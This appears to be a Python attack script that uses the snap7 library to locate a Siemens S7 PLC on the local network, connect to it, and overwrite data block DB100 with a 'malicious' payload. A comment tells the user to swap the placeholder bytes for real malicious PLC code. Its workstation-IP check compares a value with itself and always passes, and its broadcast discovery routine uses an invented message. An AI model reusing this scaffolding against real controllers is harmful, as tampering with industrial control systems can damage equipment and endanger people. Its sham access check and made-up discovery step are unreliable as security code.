import snap7  # Assuming you're using snap7 for S7 PLC communication
import socket
import struct
import time

# Configuration (Replace with your actual values)
PLC_IP = None # Will be discovered
PLC_RACK = 0
PLC_SLOT = 1
WS_IP = "192.168.1.100" # Example: Your engineering workstation IP to filter program download origins.
MODIFICATION_LOG_FILE = "plc_modifications.log" #File to log all modifications 

# --- IP Discovery Function ---
def discover_plc_ip():
    """
    Attempts to discover the PLC's IP address on the local network.
    This is a simplified example and may need adjustment depending on your network setup.
    """
    # Create a UDP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)  # Enable broadcast
    sock.settimeout(5)  # Timeout after 5 seconds

    # Broadcast a discovery message (you can customize this)
    message = b"PLC_DISCOVERY_REQUEST"  #Define the message

    # Define a common port
    port = 50001

    sock.sendto(message, ('<broadcast>', port)) # Broadcast to <broadcast> (usually 255.255.255.255)

    try:
        data, addr = sock.recvfrom(1024)  # Buffer size 1024 bytes
        print(f"Received: {data.decode()} from {addr}")  # Print the result

        # Basic check for a PLC response (customize as needed)
        if "PLC_RESPONSE" in data.decode(): # Assuming the PLC responds with a specific phrase.
            sock.close()
            return addr[0]  # IP address from the received packet
        else:
            print("Received an unexpected response.")
            return None

    except socket.timeout:
        print("No PLC response received after 5 seconds.")
        return None
    finally:
        sock.close()


# --- PLC Interaction Functions ---
def plc_connect(ip, rack, slot):
    """Connects to the PLC."""
    plc = snap7.client.Client()
    plc.connect(ip, rack, slot)
    return plc

def plc_disconnect(plc):
    """Disconnects from the PLC."""
    plc.disconnect()

def read_plc_program(plc, db_number, start_address, size):
    """Reads a portion of the PLC program (e.g., a Data Block)."""
    try:
        data = plc.db_read(db_number, start_address, size)
        return data
    except Exception as e:
        print(f"Error reading from PLC: {e}")
        return None

def write_plc_program(plc, db_number, start_address, data):
    """Writes data to a Data Block in the PLC.  THIS IS THE DANGEROUS FUNCTION."""
    try:
        plc.db_write(db_number, start_address, data)
        log_modification(f"Wrote to DB{db_number}, address {start_address}, length {len(data)}")
    except Exception as e:
        print(f"Error writing to PLC: {e}")
        return False
    return True

def download_plc_program(plc, program_data):
    """Simulates a program download (simplified).

    This example only showcases writing data.  A real program download involves more complex interactions.
    """
    # In this simplified example, we assume program_data is intended for DB100, starting at offset 0.
    # Adjust DB number and start address as appropriate for your PLC and the nature of the 'program_data'.
    db_number = 100
    start_address = 0

    if write_plc_program(plc, db_number, start_address, program_data):
        log_modification(f"Simulated Program Download to DB{db_number}, starting at {start_address}")
        return True
    else:
        return False

def verify_workstation_ip(ip_address):
        """Verifies that the connection originates from a trusted workstation."""
        if ip_address != WS_IP:
            print(f"Unauthorized access attempt from IP: {ip_address}")
            log_modification(f"Unauthorized access attempted from {ip_address}")
            return False
        return True

def log_modification(message):
    """Logs the PLC modification attempt with a timestamp."""
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    with open(MODIFICATION_LOG_FILE, "a") as f:
        f.write(f"{timestamp} - {message}\n")
    print(f"Logged: {message}")

# --- Main Execution ---

if __name__ == "__main__":

    # 1. IP Discovery
    print("Attempting to discover PLC IP address...")
    PLC_IP = discover_plc_ip()

    if PLC_IP is None:
        print("PLC IP discovery failed.  Exiting.")
        exit()

    print(f"PLC IP address discovered: {PLC_IP}")


    # 2. Connect to PLC
    try:
        plc = plc_connect(PLC_IP, PLC_RACK, PLC_SLOT)
        print(f"Connected to PLC at {PLC_IP}")
    except Exception as e:
        print(f"Failed to connect to PLC: {e}")
        exit()


    # 3. Simulate Malicious Modification (Example)
    try:
        # **VERY IMPORTANT: REPLACE THIS WITH ACTUAL MALICIOUS CODE**
        # This is a placeholder.  Real attacks would inject crafted PLC code.

        malicious_code = b"\xDE\xAD\xBE\xEF" * 10  # Example: Some dummy data

        print("Simulating malicious program modification...")
        if verify_workstation_ip(WS_IP):
             if download_plc_program(plc, malicious_code):
                    print("Malicious program modification successful (simulated).")
             else:
                print("Malicious program modification failed.")
    except Exception as e:
        print(f"Error during modification: {e}")


    # 4. Disconnect from PLC
    finally:
        try:
            plc_disconnect(plc)
            print("Disconnected from PLC.")
        except:
             print("Error disconnecting from PLC")